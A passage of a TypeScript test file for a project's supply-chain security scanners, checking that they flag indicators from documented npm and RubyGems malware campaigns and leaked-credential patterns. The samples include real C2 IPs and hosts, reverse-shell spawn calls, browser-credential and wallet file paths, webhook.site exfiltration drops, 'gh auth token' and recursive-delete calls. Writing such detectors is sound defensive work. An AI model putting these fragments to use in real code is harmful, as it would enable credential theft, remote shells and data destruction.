  const sample = [
    "// unsafe: documented Advcash reverse-shell C2 IP, bare literal",
    'const c2 = "65.109.184.223";',
    "",
    "// unsafe: same IP used inside `client.connect(8443, ...)`",
    'client.connect(8443, "65.109.184.223");',
    "",
    "// unsafe: reverse-shell shell prefix (sh)",
    'cp.spawn("/bin/sh", []);',
    "",
    "// unsafe: reverse-shell shell prefix (bash)",
    'cp.spawn("/bin/bash", ["-i"]);',
    "",
    "// unsafe: reverse-shell shell prefix (zsh)",
    'cp.spawn("/bin/zsh", []);',
    "",
    "// unsafe: Windows reverse-shell shell prefix",
    'cp.spawn("cmd.exe", ["/c", "whoami"]);',
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 6, JSON.stringify(findings, null, 2));
  assert.match(findings[0]!.reason, /65\.109\.184\.223/);
  assert.match(findings[1]!.reason, /65\.109\.184\.223/);
  for (const shellFinding of findings.slice(2)) {
    assert.match(shellFinding.reason, /reverse-shell shell prefix|shell-name literal/i);
    assert.match(shellFinding.reason, /merchant-advcash/i);
  }
});

test("verify-no-registry-exfiltration flags every Lazarus BeaverTail / InvisibleFerret IOC", async () => {
  // Socket 2025-03-10 — BeaverTail (browser-credential + crypto-wallet
  // stealer) + InvisibleFerret backdoor inside six typosquatted npm
  // packages. Documented at
  // https://socket.dev/blog/lazarus-strikes-npm-again-with-a-new-wave-of-malicious-packages.
  // The bare-IP C2 literal slips past the raw-IPv4 URL gate when it is
  // assigned to a variable for later string-concat into a URL, and the
  // browser-stealer / wallet-stealer file-path literals have no
  // legitimate use inside a backend HTTP framework's runtime source.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// unsafe: documented BeaverTail C2 IP, bare literal",
    'const c2 = "172.86.84.38";',
    "",
    "// unsafe: Chrome / Brave / Chromium credentials DB filename",
    'const db = path.join(profile, "Login Data");',
    "",
    "// unsafe: Chromium browser extension storage path",
    'const ext = profile + "/Local Extension Settings";',
    "",
    "// unsafe: Solana CLI keypair path",
    'const k = home + "/.config/solana/id.json";',
    "",
    "// unsafe: Exodus desktop wallet filename",
    'const w = "exodus.wallet";',
    "",
    "// unsafe: macOS Keychain directory",
    'const kc = home + "/Library/Keychains/login.keychain-db";',
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 6, JSON.stringify(findings, null, 2));
  assert.match(findings[0]!.reason, /172\.86\.84\.38/);
  assert.match(findings[1]!.reason, /Login Data/);
  assert.match(findings[2]!.reason, /Local Extension Settings/);
  assert.match(findings[3]!.reason, /solana\/id\.json/);
  assert.match(findings[4]!.reason, /exodus\.wallet/);
  assert.match(findings[5]!.reason, /Library\/Keychains/);
  for (const finding of findings) {
    assert.match(finding.reason, /BeaverTail|Lazarus/);
  }
});

test("verify-no-registry-exfiltration flags xlsx-to-json-lh codebase-wiper IOCs", async () => {
  // Socket 2025-05-30 codebase-wiper campaign documented at
  // https://socket.dev/blog/npm-package-wipes-codebases-with-remote-trigger —
  // the `xlsx-to-json-lh` typosquat opened a socket.io C2 channel to
  // `informer-server.herokuapp.com` and, on receiving a `remise à zéro`
  // message, recursively deleted the consumer's project root via
  // `rmDir(projectRoot)` (fs.rmSync-shape recursive delete). None of
  // these primitives are caught by the upstream child_process / TLS /
  // raw-IPv4 / browser-stealer gates above on their own.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// unsafe: documented C2 host literal",
    'const c2 = "https://informer-server.herokuapp.com";',
    "",
    "// unsafe: bare-literal trigger phrase (with accents)",
    'if (data.type === "remise à zéro") wipe();',
    "",
    "// unsafe: trigger phrase without accents",
    'if (data.type === "remise a zero") wipe();',
    "",
    "// unsafe: recursive directory delete (sync)",
    'fs.rmSync(projectRoot, { recursive: true, force: true });',
    "",
    "// unsafe: legacy rmdirSync",
    'fs.rmdirSync(projectRoot, { recursive: true });',
    "",
    "// unsafe: promise-based fs.rm()",
    'await fsp.rm(projectRoot, { recursive: true, force: true });',
    "",
    "// unsafe: unlinkSync",
    'fs.unlinkSync(envFile);',
    "",
    "// unsafe: destructured unlinkSync()",
    "unlinkSync(keyFile);",
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 8, JSON.stringify(findings, null, 2));
  assert.match(findings[0]!.reason, /informer-server\.herokuapp\.com/);
  assert.match(findings[1]!.reason, /remise à zéro/);
  assert.match(findings[2]!.reason, /remise à zéro/);
  for (const deletion of findings.slice(3)) {
    assert.match(deletion.reason, /destructive filesystem-deletion API/);
    assert.match(deletion.reason, /xlsx-to-json-lh/);
  }
});

test("verify-no-registry-exfiltration flags Vietnam-Telegram-ban Fastlane-typosquat IOCs", async () => {
  // Socket 2025-06-03 RubyGems campaign documented at
  // https://socket.dev/blog/malicious-ruby-gems-exfiltrate-telegram-tokens-and-messages-following-vietnam-ban —
  // two malicious Fastlane plugin gems replaced
  // `https://api.telegram.org/bot{token}/sendMessage` with a hardcoded
  // Cloudflare Worker C2 at
  // `https://rough-breeze-0c37.buidanhnam95.workers.dev/bot{token}/sendMessage`
  // to silently exfiltrate Telegram bot tokens, chat IDs, messages,
  // and attached files. The endpoint-substitution + opaque-Worker-relay
  // tradecraft translates verbatim to npm.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// unsafe: documented exact-host C2 IOC",
    'const c2 = "rough-breeze-0c37.buidanhnam95.workers.dev";',
    "",
    "// unsafe: URL-shaped exact-host C2 IOC (also matches generic Worker rule)",
    'const base = "https://rough-breeze-0c37.buidanhnam95.workers.dev/bot" + token + "/sendMessage";',
    "",
    "// unsafe: arbitrary Cloudflare Worker URL literal",
    'const relay = "https://some-other-worker.example.workers.dev/relay";',
    "",
    "// unsafe: http (not https) Worker URL",
    'const relay2 = "http://attacker.workers.dev/exfil";',
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 4, JSON.stringify(findings, null, 2));
  assert.match(findings[0]!.reason, /rough-breeze-0c37\.buidanhnam95\.workers\.dev/);
  // Lines 1 and 2 both contain the exact-host IOC, which matches first
  // in the FORBIDDEN_PATTERNS order; only the third sample (different
  // Worker subdomain) and fourth (http) hit the generic Worker rule.
  assert.match(findings[1]!.reason, /rough-breeze-0c37\.buidanhnam95\.workers\.dev/);
  assert.match(findings[2]!.reason, /URL-shaped Cloudflare Worker/);
  assert.match(findings[3]!.reason, /URL-shaped Cloudflare Worker/);
});

test("verify-no-registry-exfiltration ignores benign workers.dev mentions", async () => {
  // Negative: the bare PSL suffix `workers.dev` (legitimately listed
  // in `src/subdomains.ts`) and doc-comment mentions of the IOC
  // hostname must NOT trip the Vietnam-Telegram-ban gate.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// safe: doc-comment mention of `*.workers.dev` as a PSL entry",
    "// safe: doc-comment mention of the IOC host rough-breeze-0c37.buidanhnam95.workers.dev",
    "",
    "// safe: bare PSL suffix string (no `://` prefix, no subdomain)",
    'const psl = "workers.dev";',
    "",
    "// safe: list with bare suffix",
    'const suffixes = ["workers.dev", "pages.dev"];',
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
});

test("verify-no-registry-exfiltration flags @crypto-exploit BSC/Ethereum wallet-drainer IOCs", async () => {
  // Socket 2025-06-02 wallet-drainer campaign documented at
  // https://socket.dev/blog/malicious-npm-packages-target-bsc-and-ethereum —
  // four malicious npm packages (`pancake_uniswap_validators_utils_snipe`,
  // `pancakeswap-oracle-prediction`, `ethereum-smart-contract`,
  // `env-process`) all read the victim's wallet env vars, signed a
  // transaction transferring 80–85 % of the balance to the same
  // hardcoded attacker address via `web3.eth.accounts.signTransaction`,
  // and broadcast it via `web3.eth.sendSignedTransaction`. None of
  // the upstream child_process / TLS / postinstall gates catch this
  // on their own.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// unsafe: documented attacker wallet address",
    'const drain = "0x71448ec2D9c5fC4978F5A690D5CE11A8669C9D02";',
    "",
    "// unsafe: web3 transaction-signing primitive",
    "const signed = await web3.eth.accounts.signTransaction(tx, key);",
    "",
    "// unsafe: destructured-then-renamed signing primitive",
    "const out = await accounts.signTransaction(tx, key);",
    "",
    "// unsafe: web3 signed-transaction broadcast primitive",
    "await web3.eth.sendSignedTransaction(signed.rawTransaction);",
    "",
    "// unsafe: bare sendSignedTransaction call site",
    "await sendSignedTransaction(raw);",
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 5, JSON.stringify(findings, null, 2));
  assert.match(findings[0]!.reason, /0x71448ec2D9c5fC4978F5A690D5CE11A8669C9D02/);
  assert.match(findings[1]!.reason, /signTransaction/);
  assert.match(findings[2]!.reason, /signTransaction/);
  assert.match(findings[3]!.reason, /sendSignedTransaction/);
  assert.match(findings[4]!.reason, /sendSignedTransaction/);
  for (const finding of findings) {
    assert.match(finding.reason, /crypto-exploit|BSC\/Ethereum/);
  }
});

test("verify-no-registry-exfiltration ignores benign wallet-drainer-shaped tokens", async () => {
  // Negative: doc-comment mentions of the IOC wallet, the bare word
  // `signTransaction` as a property name in an object literal (no
  // call), and unrelated `sendSigned*`-prefixed identifiers must NOT
  // trip the wallet-drainer gate.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// safe: doc-comment mention of the attacker wallet",
    "// IOC: 0x71448ec2D9c5fC4978F5A690D5CE11A8669C9D02 is the drainer wallet",
    "",
    "// safe: property-equality comparison on the method name",
    "if (api.name === 'signTransaction') skip();",
    "",
    "// safe: unrelated identifier (no `accounts.signTransaction(` shape)",
    "const sendSignedTransactionLog = createLogger();",
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
});

test("verify-no-registry-exfiltration flags surveillance-malware (dpsdatahub / nodejs-backpack / m0m0x01d) IOCs", async () => {
  // Socket 2025-07-23 surveillance-malware campaign documented at
  // https://socket.dev/blog/surveillance-malware-hidden-in-npm-and-pypi-packages —
  // three npm packages (`dpsdatahub`, `nodejs-backpack`, `m0m0x01d`,
  // ~56k combined downloads with `vfunctions` on PyPI) install
  // keyloggers, screen / webcam capture, and credential harvesting,
  // exfiltrating to a fragmented Slack incoming-webhook, an AWS S3
  // invisible-iframe keylogger host, and Burp Collaborator subdomains
  // dynamically constructed at runtime. None of the upstream
  // child_process / TLS / postinstall gates catch these in-process
  // primitives on their own.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// unsafe: dpsdatahub invisible-iframe keylogger S3 host",
    'const iframeSrc = "https://dpsiframe.s3.eu-central-1.amazonaws.com/index.html";',
    "",
    "// unsafe: nodejs-backpack-shaped Slack-webhook URL (placeholders, not a",
    "// real webhook secret — push-protection-safe; only the path prefix matters)",
    'const slack = "https://hooks.slack.com/services/PLACEHOLDER/PLACEHOLDER/PLACEHOLDER";',
    "",
    "// unsafe: m0m0x01d Burp Collaborator C2 endpoint",
    'const c2 = "https://es.t-mobile.com.mmcyrtl8tknr87hk8d9j6upi69c10q.burpcollaborator.net/xxxxxxxxx";',
    "",
    "// unsafe: secondary Burp Collaborator relay used by m0m0x01d",
    'const relay = "https://bm1nrilxt9ng8wh982986jp76yco0d.burpcollaborator.net/keystrokes";',
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 4, JSON.stringify(findings, null, 2));
  assert.match(findings[0]!.reason, /dpsiframe\.s3\.eu-central-1\.amazonaws\.com/);
  assert.match(findings[1]!.reason, /hooks\.slack\.com\/services/);
  assert.match(findings[2]!.reason, /burpcollaborator\.net/);
  assert.match(findings[3]!.reason, /burpcollaborator\.net/);
  for (const finding of findings) {
    assert.match(finding.reason, /surveillance-malware|dpsdatahub|nodejs-backpack|m0m0x01d/);
  }
});

test("verify-no-registry-exfiltration ignores benign surveillance-malware-shaped tokens", async () => {
  // Negative: doc-comment mentions of the IOC hosts, the bare
  // `hooks.slack.com` documentation host (no `/services/` path), and
  // unrelated `*.amazonaws.com` / `*.net` literals must NOT trip the
  // surveillance-malware gate.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// safe: doc-comment mention of the dpsdatahub IOC host",
    "// IOC: dpsiframe.s3.eu-central-1.amazonaws.com is the keylogger iframe host",
    "",
    "// safe: doc-comment mention of the Burp Collaborator C2 channel",
    "// IOC: <random>.burpcollaborator.net was used by m0m0x01d",
    "",
    "// safe: doc-comment mention of the Slack webhook host",
    "// note: hooks.slack.com/services/<...> is the nodejs-backpack exfil channel",
    "",
    "// safe: bare Slack API host (no /services/ webhook path)",
    'const slackApi = "https://slack.com/api/chat.postMessage";',
    "",
    "// safe: unrelated AWS S3 host (different bucket and region)",
    'const bucket = "https://my-app-assets.s3.us-east-1.amazonaws.com/logo.png";',
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
});

test("verify-no-registry-exfiltration ignores benign deletion-shaped tokens", async () => {
  // Negative: doc-comment mentions of the wiper IOCs, property
  // comparisons against `.rm`, non-destructive fs APIs, and mkdir
  // with `{ recursive: true }` (which is a totally legitimate
  // ensure-dir pattern) must NOT trip the wiper gate.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// safe: doc-comment mention of the C2 host",
    "// the xlsx-to-json-lh malware C2 was informer-server.herokuapp.com",
    "",
    "// safe: doc-comment mention of the trigger phrase remise à zéro",
    "",
    "// safe: non-destructive fs API (mkdir with recursive flag)",
    'await fsp.mkdir(target, { recursive: true });',
    "",
    "// safe: non-destructive fs API (readdir)",
    'await fsp.readdir(target);',
    "",
    "// safe: equality comparison on a method name (not a call)",
    "if (action.name === 'rmSync') skip();",
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
});

test("verify-no-registry-exfiltration ignores benign IP-shaped tokens", async () => {
  // Negative: dotted-quad version strings, doc-comment mentions of
  // the IOC IP, and benign shell-name mentions inside line comments
  // must NOT trip the Advcash gate.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// safe: doc-comment mention of the IOC IP",
    "// the Advcash C2 was 65.109.184.223 on port 8443",
    "",
    "// safe: dotted-quad version literal that is NOT the IOC IP",
    'const version = "1.2.3.4";',
    "",
    "// safe: line-comment mention of /bin/sh",
    "// note: never spawn /bin/sh from runtime code",
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
});

test("verify-no-registry-exfiltration flags Toptal GitHub-org hijack IOCs", async () => {
  // Socket 2025-07-23 Toptal GitHub-org hijack documented at
  // https://socket.dev/blog/toptal-s-github-organization-hijacked-10-malicious-packages-published —
  // 10 `@toptal/picasso-*` packages were republished on 2025-07-20
  // with destructive `preinstall` + `postinstall` lifecycle hooks
  // embedded directly in `package.json` that POSTed the victim's
  // `gh auth token` to a `webhook.site` drop and then attempted
  // `sudo rm -rf --no-preserve-root /`. The install-time channel is
  // already closed by `ignore-scripts=true` + `verify-no-lifecycle-scripts`
  // + the 24h release cooldown — this regression net catches a
  // separate vector where a malicious PR copies the payload as
  // string literals into `src/**` runtime code.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// unsafe: generic webhook.site exfiltration drop",
    'const drop = "https://webhook.site/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee";',
    "",
    "// unsafe: the documented Toptal IOC channel UUID",
    'const ioc = "fb5b4647-aff8-418c-99e7-ec830cc2024b";',
    "",
    "// unsafe: GitHub-CLI token-harvest command literal",
    'const cmd = "gh auth token";',
    "",
    "// unsafe: destructive rm flag that overrides root safety",
    'const flag = "--no-preserve-root";',
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 4, JSON.stringify(findings, null, 2));
  assert.match(findings[0]!.reason, /webhook\.site/);
  assert.match(findings[1]!.reason, /fb5b4647-aff8-418c-99e7-ec830cc2024b/);
  assert.match(findings[2]!.reason, /gh auth token/);
  assert.match(findings[3]!.reason, /--no-preserve-root/);
  for (const finding of findings) {
    assert.match(finding.reason, /Toptal/);
  }
});

test("verify-no-registry-exfiltration ignores benign Toptal-shaped tokens", async () => {
  // Negative: doc-comment mentions of the Toptal IOCs, an unrelated
  // host that merely *contains* the substring `webhook` (e.g.
  // `webhooks.example.com` without `.site/`), and the bare word
  // `gh` / `rm` outside their attack-shape must NOT trip the gate.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// safe: doc-comment mention of the IOC drop",
    "// the Toptal payload POSTed to https://webhook.site/fb5b4647-aff8-418c-99e7-ec830cc2024b",
    "",
    "// safe: doc-comment mention of the IOC UUID",
    "// IOC: fb5b4647-aff8-418c-99e7-ec830cc2024b is the Toptal webhook channel",
    "",
    "// safe: doc-comment mention of the harvest command",
    "// the payload ran `gh auth token` to dump the GitHub token",
    "",
    "// safe: doc-comment mention of the destructive flag",
    "// `--no-preserve-root` overrides the rm root safety check",
    "",
    "// safe: unrelated host that contains the substring `webhook`",
    'const url = "https://webhooks.example.com/incoming";',
    "",
    "// safe: bare ghost-prefixed identifier (not `gh auth token`)",
    "const ghostUser = await loadGhostUser();",
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
});

test("verify-no-registry-exfiltration flags the react-login-page keylogger IOCs", async () => {
  // Positive: the documented IOCs from the Socket 2024-07-02 write-up on
  // the `reect-login-page` typosquat keylogger family
  // (https://socket.dev/blog/malicious-npm-package-typosquats-react-login-page-to-deploy-keylogger):
  //   - C2 host + path `adlinczewska.pl/beaut-login/keylog.php`
  //   - `new Image()` pixel-beacon constructor used to bypass CORS
  //     by setting `.src = url + keystrokes` (image requests are not
  //     subject to the Same-Origin Policy).
  // Both are DOM-only / browser-side primitives that have no place in
  // `@daloyjs/core`'s server-side `src/**` runtime source.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// unsafe: documented C2 host + path for the reect-login-page keylogger",
    'const exfil = "https://adlinczewska.pl/beaut-login/keylog.php?c=" + keys;',
    "",
    "// unsafe: DOM-only pixel-beacon constructor that bypasses CORS",
    "const beacon = new Image();",
    "beacon.src = exfil;",
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 2, JSON.stringify(findings, null, 2));
  assert.match(findings[0]!.reason, /adlinczewska\.pl\/beaut-login/);
  assert.match(findings[1]!.reason, /new Image\(\)/);
  for (const finding of findings) {
    assert.match(finding.reason, /reect-login-page/);
  }
});

test("verify-no-registry-exfiltration ignores benign react-login-shaped tokens", async () => {
  // Negative: a doc-comment mention of the IOC host, an unrelated host
  // that merely *contains* the substring `adlinczewska` outside the
  // `/beaut-login` path, and an identifier like `newImage` (no space
  // and no `(` immediately after `Image`) must NOT trip the gate.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// safe: doc-comment mention of the IOC host",
    "// the reect-login-page keylogger POSTed to adlinczewska.pl/beaut-login/keylog.php",
    "",
    "// safe: unrelated identifier (no `new ` prefix, no `(` suffix)",
    "const newImage = await loadImage();",
    "",
    "// safe: a property access on an `Image` namespace, not a constructor call",
    "const fmt = Image.format;",
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
});

test("verify-no-registry-exfiltration accepts the live src/ tree", async () => {
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const { readFile, readdir } = await import("node:fs/promises");
  const path = await import("node:path");
  const srcRoot = path.resolve(process.cwd(), "src");
  async function* walk(dir: string): AsyncGenerator<string> {
    for (const entry of await readdir(dir, { withFileTypes: true })) {
      const child = path.join(dir, entry.name);
      if (entry.isDirectory()) yield* walk(child);
      else if (entry.isFile() && /\.(?:m?ts|m?js)$/.test(entry.name)) yield child;
    }
  }
  let total = 0;
  for await (const absolute of walk(srcRoot)) {
    const rel = path.relative(process.cwd(), absolute);
    const text = await readFile(absolute, "utf8");
    total += findForbiddenRegistryExfilCalls(rel, text).length;
  }
  assert.equal(
    total,
    0,
    "src/ must remain free of TLS-verification bypasses, HOME mutations, host credential-file " +
      "references, and package-registry publish-API paths (GemStuffer class); see " +
      "https://socket.dev/blog/gemstuffer",
  );
});

// ---------- verify-no-vulnerable-sandboxes (Socket vm2 CVE-2026-26956 gate) ----------

test("verify-no-vulnerable-sandboxes flags every forbidden sandbox package across every dep bucket", async () => {
  const { findForbiddenSandboxesInPackageJson, FORBIDDEN_SANDBOX_PACKAGES } =
    await import("../scripts/verify-no-vulnerable-sandboxes.js");
  // All forbidden names appear in at least one bucket, plus
  // `bundledDependencies` (array form) to exercise that branch.
  const pkg = {
    dependencies: { vm2: "3.10.4", left_pad: "1.3.0" },
    devDependencies: { "safe-eval": "0.4.1" },
    peerDependencies: { notevil: "1.0.0" },
    optionalDependencies: { "static-eval": "2.1.0", "vm2-sandbox-escape": "1.0.0" },
    bundledDependencies: ["eval-sandbox", "lodash"],
  };
  const findings = findForbiddenSandboxesInPackageJson("fake/package.json", pkg);
  const names = findings.map((f) => f.packageName).sort();
  assert.deepEqual(names, [...FORBIDDEN_SANDBOX_PACKAGES].sort());
  assert.ok(findings.every((f) => f.file === "fake/package.json"));
  assert.ok(
    findings.some((f) => /bundledDependencies/.test(f.reason)),
    "bundledDependencies entries should be reported",
  );
});

test("verify-no-vulnerable-sandboxes ignores benign package.json content", async () => {
  const { findForbiddenSandboxesInPackageJson } = await import(
    "../scripts/verify-no-vulnerable-sandboxes.js"
  );
  const pkg = {
    name: "ok",
    dependencies: { zod: "^4.0.0", "isolated-vm": "^5.0.0" }, // isolated-vm is allowed
    devDependencies: { typescript: "^6.0.0", tsx: "^4.0.0" },
    peerDependencies: { "@daloyjs/core": "^0.45.0" },
  };
  const findings = findForbiddenSandboxesInPackageJson("ok/package.json", pkg);
  assert.deepEqual(findings, []);
});

test("verify-no-vulnerable-sandboxes flags pnpm-9 lockfile snapshots of forbidden packages", async () => {
  const { findForbiddenSandboxesInLockfile } = await import(
    "../scripts/verify-no-vulnerable-sandboxes.js"
  );
  const lock = [
    "lockfileVersion: '9.0'",
    "",
    "snapshots:",
    "",
    "  vm2@3.10.4:",
    "    resolution: {integrity: sha512-xxx}",
    "",
    "  'safe-eval@0.4.1':",
    "    resolution: {integrity: sha512-yyy}",
    "",
    "  notevil@1.3.3:",
    "    resolution: {integrity: sha512-zzz}",
    "",
    "  lodash@4.17.21:",
    "    resolution: {integrity: sha512-aaa}",
  ].join("\n");
  const findings = findForbiddenSandboxesInLockfile("pnpm-lock.yaml", lock);
  const names = findings.map((f) => f.packageName).sort();
  assert.deepEqual(names, ["notevil", "safe-eval", "vm2"]);
  assert.ok(findings.every((f) => /pnpm-lock\.yaml:\d+/.test(f.file)));
});

test("verify-no-vulnerable-sandboxes does not false-positive on benign lockfile substrings", async () => {
  const { findForbiddenSandboxesInLockfile } = await import(
    "../scripts/verify-no-vulnerable-sandboxes.js"
  );
  // `evm2-foo` and `static-evaluator` share substrings with forbidden
  // names but are *not* the forbidden packages themselves.
  const lock = [
    "  evm2-foo@1.0.0:",
    "    resolution: {integrity: sha512-aaa}",
    "  static-evaluator@2.0.0:",
    "    resolution: {integrity: sha512-bbb}",
    "  # vm2 mentioned only in a comment, never resolved",
    "  zod@4.4.3:",
    "    resolution: {integrity: sha512-ccc}",
  ].join("\n");
  const findings = findForbiddenSandboxesInLockfile("pnpm-lock.yaml", lock);
  assert.deepEqual(findings, []);
});

test("verify-no-vulnerable-sandboxes accepts the live tracked package.json + lockfile set", async () => {
  const {
    findForbiddenSandboxesInPackageJson,
    findForbiddenSandboxesInLockfile,
  } = await import("../scripts/verify-no-vulnerable-sandboxes.js");
  const { readFile, readdir, stat } = await import("node:fs/promises");
  const path = await import("node:path");
  const root = process.cwd();
  const SKIP = new Set([
    "node_modules",
    ".git",
    ".next",
    "dist",
    "dist-coverage",
    "coverage",
    "temp_tarball",
    "generated",
  ]);
  async function* walk(dir: string): AsyncGenerator<string> {
    for (const entry of await readdir(dir, { withFileTypes: true })) {
      if (entry.name.startsWith(".") && entry.name !== ".github") continue;
      if (SKIP.has(entry.name)) continue;
      const child = path.join(dir, entry.name);
      if (entry.isDirectory()) yield* walk(child);
      else if (entry.isFile() && entry.name === "package.json") yield child;
    }
  }
  let total = 0;
  for await (const absolute of walk(root)) {
    const text = await readFile(absolute, "utf8");
    let parsed: unknown;
    try {
      parsed = JSON.parse(text);
    } catch {
      continue;
    }
    const rel = path.relative(root, absolute);
    total += findForbiddenSandboxesInPackageJson(
      rel,
      parsed as Parameters<typeof findForbiddenSandboxesInPackageJson>[1],
    ).length;
  }
  const lockPath = path.join(root, "pnpm-lock.yaml");
  try {
    const stats = await stat(lockPath);
    if (stats.isFile()) {
      const lock = await readFile(lockPath, "utf8");
      total += findForbiddenSandboxesInLockfile("pnpm-lock.yaml", lock).length;
    }
  } catch {
    /* no lockfile present */
  }
  assert.equal(
    total,
    0,
    "Daloy repo must not depend on `vm2` or related in-process JS sandboxes; see " +
      "https://socket.dev/blog/free-certified-patches-for-critical-vm2-sandbox-escape",
  );
});

// ---------- verify-no-leaked-credentials ----------

test("scanFileContentForCredentials catches every documented secret pattern", () => {
  const samples: { line: string; expect: RegExp }[] = [
    { line: "AKIA0123456789ABCDEF", expect: /AWS access key id/ },
    {
      line: "token: ghp_abcdefghijklmnopqrstuvwxyz0123456789",
      expect: /GitHub personal access token/,
    },
    {
      line: "GITHUB_TOKEN=github_pat_" + "A".repeat(82),
      expect: /GitHub fine-grained PAT/,
    },
    {
      line: "//registry.npmjs.org/:_authToken=npm_abcdefghijklmnopqrstuvwxyz0123456789",
      expect: /npm access token/,
    },
    {
      // Split prefix so GitHub push protection doesn't flag this test sample
      // as a real Slack token; the concatenation reassembles at runtime so
      // the scanFileContentForCredentials regex still matches.
      line: "SLACK=" + "xox" + "b-1234567890-ABCDEFGHIJKLMNOPQRST",
      expect: /Slack token/,
    },
    {
      line: "STRIPE=sk_live_" + "A".repeat(30),
      expect: /Stripe live secret key/,
    },
    {
      line: "MAPS=AIza" + "B".repeat(35),
      expect: /Google API key/,
    },
    {
      line: "-----BEGIN OPENSSH PRIVATE KEY-----",
      expect: /PEM private-key block/,
    },
    {
      line: "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abcdefghijklmno",
      expect: /JWT-shaped string/,
    },
  ];
  for (const { line, expect } of samples) {
    const hits = scanFileContentForCredentials(line);
    assert.ok(
      hits.some((h) => expect.test(h.detail)),
      `pattern ${expect} should match ${line}`,
    );
  }
});

test("scanFileContentForCredentials does not flag harmless content", () => {
  const clean = [
    "// A comment about how AKIA-style strings are not real here.",
    'const greeting = "hello world";',
    "const port = process.env.PORT ?? 3000;",
    "// JWT example: eyJ truncated, not a full token",
    "const aws = 'AKIA'; // bare prefix only",
  ].join("\n");
  assert.equal(scanFileContentForCredentials(clean).length, 0);
});

test("CREDENTIAL_CONTENT_PATTERNS export is non-empty and frozen", () => {
  assert.ok(CREDENTIAL_CONTENT_PATTERNS.length > 5);
  assert.ok(Object.isFrozen(CREDENTIAL_CONTENT_PATTERNS));
});

test("verify-no-leaked-credentials accepts the live publishable packages", async () => {
  // Each publishable package must report zero findings on the live tree.
  // Missing paths (e.g. `dist/` before a fresh build) are silently skipped
  // by the gate, so this test passes whether or not `pnpm build` has run.
  for (const pkg of PUBLISHABLE_PACKAGES) {
    const findings = await findCredentialLeaks(pkg);
    assert.deepEqual(
      [...findings],
      [],
      `${pkg.name} must not ship any secret-shaped filename or credential-shaped string ` +
        "(see https://snyk.io/blog/leaked-credentials-in-packages/)",
    );
  }
});

test("findCredentialLeaks flags secret-shaped filenames added to a package", async () => {
  const { mkdtemp, writeFile, mkdir } = await import("node:fs/promises");
  const { tmpdir } = await import("node:os");
  const path = await import("node:path");
  const dir = await mkdtemp(path.join(tmpdir(), "daloy-credleak-"));
  await writeFile(
    path.join(dir, "package.json"),
    JSON.stringify({ name: "leaky", version: "0.0.0", files: ["dist"] }),
  );
  await mkdir(path.join(dir, "dist"));
  await writeFile(path.join(dir, "dist", ".env"), "OPENAI_API_KEY=sk-redacted");
  await writeFile(
    path.join(dir, "dist", "ok.js"),
    "export const ok = true; // " + "AKIA" + "ABCDEFGHIJKLMNOP",
  );
  const findings = await findCredentialLeaks(
    { name: "leaky", packageDir: "." },
    dir,
  );
  // Both: the `.env` filename AND the AWS-key-shaped string in ok.js.
  assert.equal(findings.length, 2);
